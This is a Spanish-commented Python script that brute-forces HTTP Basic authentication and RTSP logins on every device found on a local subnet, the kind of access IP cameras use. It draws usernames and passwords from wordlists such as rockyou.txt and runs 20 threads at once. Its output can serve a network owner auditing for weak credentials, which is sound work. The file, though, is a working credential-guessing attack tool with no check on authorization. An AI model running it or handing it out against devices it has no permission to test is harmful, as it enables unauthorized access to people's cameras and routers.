#!/usr/bin/env python3
"""
Tu código de fuerza bruta exacto sin modificaciones
"""

import requests
import socket
import base64
import threading
import time

MAX_THREADS = 20
TIMEOUT = 3

def cargar_credenciales(diccionario_path):
    with open(diccionario_path, "r", encoding="utf-8", errors="ignore") as f:
        lineas = f.read().splitlines()
    credenciales = []
    for linea in lineas:
        if ":" in linea:
            credenciales.append(tuple(linea.split(":", 1)))
    return credenciales

def ataque_http(ip, puerto, credenciales, resultados):
    url = f"http://{ip}:{puerto}"
    for usuario, clave in credenciales:
        try:
            r = requests.get(url, auth=(usuario, clave), timeout=TIMEOUT)
            if r.status_code == 200:
                resultados.append(f"[HTTP] {ip}:{puerto} -> {usuario}:{clave}")
                break
        except:
            continue

def ataque_rtsp(ip, credenciales, resultados):
    for usuario, clave in credenciales:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((ip, 554))

            userpass = f"{usuario}:{clave}"
            b64_auth = base64.b64encode(userpass.encode()).decode()

            request = f"OPTIONS rtsp://{ip}/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {b64_auth}\r\n\r\n"
            sock.send(request.encode())
            resp = sock.recv(1024)
            sock.close()
            if b"200 OK" in resp:
                resultados.append(f"[RTSP] {ip}:554 -> {usuario}:{clave}")
                break
        except:
            continue

def fuerza_bruta(ip, credenciales, resultados):
    print(f"🔥 Atacando {ip} con fuerza bruta...")

    # Lanza ambos tipos de ataque
    ataque_http(ip, 80, credenciales, resultados)
    ataque_rtsp(ip, credenciales, resultados)

def iniciar_fuerza_bruta(lista_ips, diccionario_path="diccionarios/rockyou.txt"):
    credenciales = cargar_credenciales(diccionario_path)
    resultados = []
    hilos = []

    for ip in lista_ips:
        t = threading.Thread(target=fuerza_bruta, args=(ip, credenciales, resultados))
        hilos.append(t)
        t.start()
        time.sleep(0.3)  # Evita saturación

        while threading.active_count() > MAX_THREADS:
            time.sleep(0.5)

    for t in hilos:
        t.join()

    return resultados

# Ejemplo de uso con las funciones del escáner
if __name__ == "__main__":
    print("🔒 Tu código de fuerza bruta original")
    print("=" * 40)
    
    # Importar funciones del escáner
    from scanner.network_scanner import obtener_ips_dispositivos
    
    # Detectar IPs
    print("🔍 Detectando dispositivos...")
    lista_ips = obtener_ips_dispositivos("192.168.1.0/24")
    
    if lista_ips:
        print(f"🎯 IPs encontradas: {lista_ips}")
        
        # Usar diccionario que creamos
        diccionario = "diccionarios/credenciales_comunes.txt"
        
        # Tu función exacta
        resultados = iniciar_fuerza_bruta(lista_ips, diccionario)
        
        # Mostrar resultados
        print(f"\n📊 Resultados:")
        if resultados:
            for resultado in resultados:
                print(f"   🚨 {resultado}")
        else:
            print("   ✅ No se encontraron credenciales débiles")
    else:
        print("⚠️  No se encontraron dispositivos para atacar")
